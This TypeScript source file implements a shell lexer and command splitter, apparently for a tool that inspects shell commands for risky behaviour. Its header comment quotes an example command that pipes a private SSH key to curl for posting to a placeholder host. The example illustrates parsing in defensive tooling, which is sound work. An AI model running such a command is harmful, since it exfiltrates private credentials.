/**
 * A small shell lexer. It exists so that `cat ~/.ssh/id_rsa | curl -d @- https://x`
 * yields two commands with their own arguments and redirections, instead of one
 * regex guess.
 */

export type TokenKind = 'word' | 'op';

export interface ShellToken {
  kind: TokenKind;
  value: string;
  /** Offset of the token's first character in the source text. */
  index: number;
  /** The word was quoted, so it is data rather than syntax. */
  quoted: boolean;
}

/** Operators that end one command and begin another. */
const SEPARATORS = new Set(['|', '||', '&&', ';', ';;', '&', '\n', '(', ')', '{', '}', '$(', '`', '|&']);

/** Redirection operators, kept inside the command they belong to. */
const REDIRECTIONS = new Set(['>', '>>', '<', '<<', '<<<', '&>', '&>>', '>&', '<&', '|&']);

const OPERATOR_CHARS = new Set(['|', '&', ';', '<', '>', '(', ')', '{', '}', '\n', '`']);

export function lexShell(text: string): ShellToken[] {
  const tokens: ShellToken[] = [];
  let index = 0;
  let word = '';
  let wordStart = -1;
  let wordQuoted = false;

  const flush = (): void => {
    if (wordStart !== -1 && word !== '') {
      tokens.push({ kind: 'word', value: word, index: wordStart, quoted: wordQuoted });
    }
    word = '';
    wordStart = -1;
    wordQuoted = false;
  };

  while (index < text.length) {
    const char = text[index]!;

    if (char === '\\') {
      const next = text[index + 1];
      if (next === '\n' || next === undefined) {
        index += 2;
        continue;
      }
      if (wordStart === -1) wordStart = index;
      word += next;
      index += 2;
      continue;
    }

    if (char === '#' && wordStart === -1) {
      const newline = text.indexOf('\n', index);
      index = newline === -1 ? text.length : newline;
      continue;
    }

    if (char === "'" || char === '"') {
      const quote = char;
      if (wordStart === -1) wordStart = index;
      wordQuoted = true;
      index += 1;
      while (index < text.length) {
        const inner = text[index]!;
        if (inner === '\\' && quote === '"') {
          const next = text[index + 1];
          if (next !== undefined) {
            word += next;
            index += 2;
            continue;
          }
        }
        if (inner === quote) {
          index += 1;
          break;
        }
        word += inner;
        index += 1;
      }
      continue;
    }

    if (char === ' ' || char === '\t' || char === '\r') {
      flush();
      index += 1;
      continue;
    }

    // `$(` opens a command substitution, which is its own command.
    if (char === '$' && text[index + 1] === '(') {
      flush();
      tokens.push({ kind: 'op', value: '$(', index, quoted: false });
      index += 2;
      continue;
    }

    if (OPERATOR_CHARS.has(char)) {
      // `2>file` and `1>>file` keep the fd prefix out of the word.
      const operator = readOperator(text, index, word, wordStart);
      if (operator) {
        if (operator.consumesWord) {
          word = '';
          wordStart = -1;
          wordQuoted = false;
        } else {
          flush();
        }
        tokens.push({ kind: 'op', value: operator.value, index: operator.index, quoted: false });
        index = operator.index + operator.raw.length;
        continue;
      }
    }

    if (wordStart === -1) wordStart = index;
    word += char;
    index += 1;
  }

  flush();
  return tokens;
}

interface OperatorMatch {
  value: string;
  raw: string;
  index: number;
  /** The pending word was a file descriptor prefix and should be dropped. */
  consumesWord: boolean;
}

function readOperator(
  text: string,
  index: number,
  pendingWord: string,
  pendingStart: number,
): OperatorMatch | null {
  const three = text.slice(index, index + 3);
  const two = text.slice(index, index + 2);
  const one = text[index]!;

  let value: string;
  let raw: string;
  if (three === '<<<') {
    value = '<<<';
    raw = three;
  } else if (two === '>>' || two === '<<' || two === '&&' || two === '||' || two === ';;' || two === '&>' || two === '>&' || two === '<&' || two === '|&') {
    value = two;
    raw = two;
  } else {
    value = one;
    raw = one;
  }

  // A numeric prefix belongs to the redirection, not to the argument list.
  const isRedirection = value.startsWith('>') || value.startsWith('<') || value === '&>';
  if (isRedirection && pendingStart !== -1 && /^\d+$/.test(pendingWord)) {
    return { value, raw, index, consumesWord: true };
  }
  return { value, raw, index, consumesWord: false };
}

export interface ShellCommand {
  /** Argument words, in order, with redirection targets removed. */
  words: ShellToken[];
  /** Files the command redirects output into. */
  writes: ShellToken[];
  /** Files the command redirects input from. */
  reads: ShellToken[];
  /** Offset of the command's first token. */
  index: number;
}

/** Group tokens into commands, separated by pipes, `&&`, newlines and friends. */
export function splitCommands(tokens: readonly ShellToken[]): ShellCommand[] {
  const commands: ShellCommand[] = [];
  let current: ShellCommand | null = null;
  let pendingRedirection: string | null = null;

  const finish = (): void => {
    if (current && (current.words.length > 0 || current.writes.length > 0 || current.reads.length > 0)) {
      commands.push(current);
    }
    current = null;
  };

  for (const token of tokens) {
    if (token.kind === 'op') {
      if (SEPARATORS.has(token.value)) {
        finish();
        pendingRedirection = null;
        continue;
      }
      if (REDIRECTIONS.has(token.value)) {
        pendingRedirection = token.value;
        continue;
      }
      continue;
    }

    if (pendingRedirection) {
      const target = pendingRedirection;
      pendingRedirection = null;
      if (!current) current = { words: [], writes: [], reads: [], index: token.index };
      if (target === '>' || target === '>>' || target === '&>' || target === '&>>') {
        current.writes.push(token);
      } else if (target === '<' || target === '<<<' || target === '<<') {
        // Heredocs name a delimiter, not a file.
        if (target === '<') current.reads.push(token);
      }
      continue;
    }

    if (!current) current = { words: [], writes: [], reads: [], index: token.index };
    current.words.push(token);
  }

  finish();
  return commands;
}

/** Full command line text, used for `normalizeCommand` and evidence snippets. */
export function commandText(command: ShellCommand): string {
  return command.words.map((token) => token.value).join(' ');
}

/** Redirection targets that are streams rather than files. */
export function isStreamTarget(value: string): boolean {
  return (
    value === '/dev/null' ||
    value === '/dev/stdout' ||
    value === '/dev/stderr' ||
    value === '/dev/stdin' ||
    value === '/dev/tty' ||
    /^&?\d$/.test(value) ||
    value === '-'
  );
}
